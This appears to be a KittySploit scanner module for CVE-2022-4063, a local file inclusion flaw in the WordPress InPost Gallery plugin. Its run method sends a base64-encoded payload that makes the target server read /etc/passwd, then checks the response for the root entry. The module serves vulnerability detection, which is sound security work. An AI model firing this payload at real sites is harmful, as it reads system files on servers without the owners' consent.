#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress InPost Gallery plugin before 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress InPost Gallery <2.1.4.1 - Local File Inclusion Detection',
        'description': "WordPress InPost Gallery plugin before 2.1.4.1 is susceptible to local file inclusion. The plugin insecurely uses PHP's extract() function when rendering HTML views, which can allow attackers to force inclusion of malicious files and URLs. This, in turn, can enable them to execute code remotely on servers.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp-plugin', 'wp', 'inpost-gallery', 'lfi', 'wordpress', 'unauth', 'wpscan', 'pluginus', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7',
            'https://wordpress.org/plugins/inpost-gallery/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4063',
            'https://github.com/cyllective/CVEs',
            'https://github.com/im-hanzou/INPGer',
        ],
        'cve': 'CVE-2022-4063',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ==', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/html',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="WordPress InPost Gallery <2.1.4.1 - Local File Inclusion detected",
                path='/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ==',
            )
            return True
        return False

